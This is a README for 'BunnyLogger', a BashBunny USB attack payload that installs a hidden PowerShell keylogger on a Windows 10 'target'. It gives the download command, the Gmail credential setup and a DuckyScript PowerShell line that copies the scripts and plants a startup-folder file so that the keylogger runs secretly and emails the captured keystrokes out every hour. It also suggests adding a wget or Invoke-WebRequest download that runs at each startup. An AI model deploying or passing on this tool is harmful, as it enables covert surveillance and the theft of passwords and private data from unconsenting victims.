# Bunny Logger
> Chris Taylor [Blue Cosmo] | 08/24/21
---

```
__________                           .____                                      
\______   \__ __  ____   ____ ___.__.|    |    ____   ____   ____   ___________ 
 |    |  _/  |  \/    \ /    <   |  ||    |   /  _ \ / ___\ / ___\_/ __ \_  __ \
 |    |   \  |  /   |  \   |  \___  ||    |__(  <_> ) /_/  > /_/  >  ___/|  | \/
 |______  /____/|___|  /___|  / ____||_______ \____/\___  /\___  / \___  >__|   
        \/           \/     \/\/             \/    /_____//_____/      \/         
```

## Overview:
```
BunnyLogger is a BashBunny payload that uses PowerShell to log keystrokes
```
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *p.ps1*
- *p.ps1* will log keystrokes 
- *l.ps1* will email the logs every startup and every hour [via SMTP]
    - sends logs hourly, regardless of system time

## Resources:
- [YouTube Video](https://www.youtube.com/watch?v=z8KD9zU50xc)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Gmail account
    - i suggest making a separate Gmail account for this payload
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
- Windows 10 Target

## Download:
```bash
svn checkout https://github.com/CosmodiumCS/payloads/trunk/bashbunny/BunnyLogger
```

## Instructions:
Set-Up/Installation
1. change Gmail credentials in *p.ps1*
```powershell
# gmail credentials
$email = "example@gmail.com"
$password = "password"
```
2. in line 7 of *duckyscript.txt*, change 'switch1' to whatever switch you use
3. in line 7 of *duckyscript.txt*, change 'BashBunny' to the name of your BashBunny
```powershell
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
```
## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
